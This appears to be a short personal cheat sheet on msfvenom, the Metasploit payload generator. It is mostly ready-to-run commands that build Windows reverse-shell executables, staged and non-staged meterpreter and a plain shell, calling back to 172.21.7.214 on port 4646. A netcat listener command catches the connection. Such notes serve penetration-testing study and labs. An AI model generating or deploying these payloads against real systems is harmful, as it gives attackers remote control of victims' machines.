Tool to generate payloads.

---

# Installation

> sudo apt install metasploit-framework

# Examples of staged payloads

````bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=172.21.7.214 LPORT=4646 -f exe -o reverse.exe
````

`-p` --> Indicate the **payload**. In this case the payload is for generate a reverse shell by tcp
``--platform`` --> Indicate the **platform** to have compatibility
`-a` --> indicate the **architecture**
``LHOST`` --> Indicate the host that is going to receive the reverse shell
`LPORT` --> Indicate the port
`-f` --> **format**. In this case the format is a exe program
`-o` --> The name of the program generated

# Examples of non-staged payloads

````bash
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows
-a x64 LHOST=172.21.7.214 LPORT=4646 -f exe -o shell.exe
````

check that the unique difference is this part **meterpreter_reverse_tcp** 

----

## Use netcat instead of metasploit

````bash
msfvenom -p windows/x64/shell_reverse_tcp --platform windows
-a x64 LHOST=172.21.7.214 LPORT=4646 -f exe -o shell.exe
````

This is your listener

````bash
nc -nlvp 4646
````

You can use rlwrap at the beginning to have a "simulate tty"

----

# Tags

#tools #msfvenom 

---